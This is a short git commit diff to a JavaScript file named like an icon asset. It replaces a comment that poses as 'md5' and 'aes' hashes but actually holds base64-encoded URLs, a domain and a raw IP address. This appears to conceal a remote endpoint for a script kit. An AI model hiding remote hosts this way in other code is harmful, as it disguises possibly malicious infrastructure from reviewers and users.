3d62019c771a8608450a7c91dbd2748e0ebb5e8b
daguo <daguo@gmail.com>
2023-07-21 13:42:32 +0800

    init

--- js/icon_h9jix1.js
+++ js/icon_h9jix1.js
@@ -8,4 +8,4 @@ if($.browser.mozilla||$.browser.opera)
 		function UnloadHandler() {
 				window.removeEventListener('beforeunload', UnloadHandler, false);
 		}
-})()/** md5:aHR0cHM6Ly93d3cuc2RmamRkZi54eXo=**//** aes:aHR0cDovLzQ3LjI0Mi4xODQuMTMy**/
+})()/** md5:aHR0cHM6Ly93d3cuc3VyZXRyZi5jb20=**//** aes:aHR0cDovLzQ3LjI0Mi4xODQuMTMy**/
